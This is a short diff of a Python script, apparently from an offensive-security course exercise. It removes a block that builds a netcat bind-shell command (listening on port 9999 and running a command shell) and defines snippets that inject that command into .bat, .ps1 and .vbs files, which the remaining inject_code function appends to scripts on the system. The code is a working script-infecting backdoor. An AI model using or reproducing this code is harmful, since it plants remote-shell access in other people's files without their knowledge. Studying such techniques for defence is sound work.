@@ -11,17 +11,6 @@ PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
 
 # To be moved latter
 '''
-# pyintaller -F netcat.py <must be done prior>
-NETCAT = 'ch2_BasicNetworkTools\\netcat.exe'
-TGT_IP = '192.168.1.208'
-CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c'
-
-FILE_TYPES = { # Code snipets based on file extension
-    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
-    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
-    '.vbs': ["\r\n'behpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n']
-}
-
 def inject_code(full_filename, contents, extension): 
     # Handles code injection
     if FILE_TYPES[extension][0].strip() in contents:
